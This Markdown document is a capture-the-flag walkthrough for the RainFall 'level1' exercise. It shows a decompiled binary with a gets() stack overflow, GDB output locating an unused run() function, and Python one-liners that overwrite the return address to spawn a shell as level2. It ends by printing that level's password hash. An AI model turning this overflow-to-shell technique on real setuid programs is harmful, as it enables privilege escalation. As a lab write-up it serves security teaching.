# Level1

## Walkthrough

We list the files in the current home directory.

```bash
level1@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
```

We transfer the `level1` executable using **SCP** and decompile it with **Dogbolt**.

[Decompiled executable](https://dogbolt.org/?id=621e2f06-c90f-42e1-b556-a4a225fc4b1b)

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[64]; // [esp+10h] [ebp-40h] BYREF

  return (int)gets(s);
}
```

Looking at the `main()` function, we can quickly understand that we will have to exploit the executable with a **buffer overflow**. The variable `s` is a buffer of 64 bytes and `gets()` stores user input into it, but no validation is done in order to prevent the user from entering more than 64 characters.

There is also a `run()` function which is declared but never called, and it calls `system()` with `/bin/sh` as argument.

```c
int run()
{
  fwrite("Good... Wait what?\n", 1u, 0x13u, stdout);
  return system("/bin/sh");
}
```

One of the techniques used during a buffer overflow exploit is to replace the return address with a new one, either a declared function or one we would declared in the buffer.

We use **GDB** in order to get the address of `run()`.

```bash
level1@RainFall:~$ gdb level1
# [...]
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```

We run a **Python** script onto the command line to print 64 characters and append them with the address **0x08048444**, incrementing by 1 character until `run()` is called.  
Because our system is **little-endian**, we have to pass the address from the least-significant byte to the most-significant one: **08048444** becomes **44840408**.

```bash
level1@RainFall:~$ python -c "print('a' * 60 + '\x44\x84\x04\x08')" | ./level1
level1@RainFall:~$ python -c "print('a' * 61 + '\x44\x84\x04\x08')" | ./level1
# [...]
level1@RainFall:~$ python -c "print('a' * 72 + '\x44\x84\x04\x08')" | ./level1
Illegal instruction (core dumped)
level1@RainFall:~$ python -c "print('a' * 76 + '\x44\x84\x04\x08')" | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

TODO: write this part.

```bash
level1@RainFall:~$ (python -c "print('a' * 76 + '\x44\x84\x04\x08')"; cat) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

## Resources

- [An Introduction to Buffer Overflow Vulnerability](https://freedium.cfd/https://medium.com/techloop/understanding-buffer-overflow-vulnerability-85ac22ec8cd3#:%7E:text=A%20Beginner%E2%80%99s%20Guide%20to%20Buffer%20Overflow%20Vulnerability%201,Overflow%20...%207%20Security%20Measures%20...%208%20References)
- [Running a Buffer Overflow Attack - Computerphile](https://www.youtube.com/watch?v=1S0aBV-Waeo)
- [Buffer Overflows Part 1 - Jumping to Local Functions](https://www.youtube.com/watch?v=svgK9fNGTfg)
- [Why can't I open a shell from a pipelined process?](https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process)
